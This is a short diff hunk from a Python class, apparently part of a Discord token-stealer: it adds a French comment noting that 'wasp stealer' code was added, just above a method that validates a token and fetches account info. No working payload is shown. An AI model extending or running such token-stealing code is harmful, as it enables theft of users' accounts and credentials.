@@ -1181,7 +1181,7 @@ class Main:
                                             continue
         except:
             pass
-
+# un peu de wasp stealer rajouter ici.
     async def ValidateTokenAndGetInfo(self, token:str) -> None:
         try:
             baddglist = [
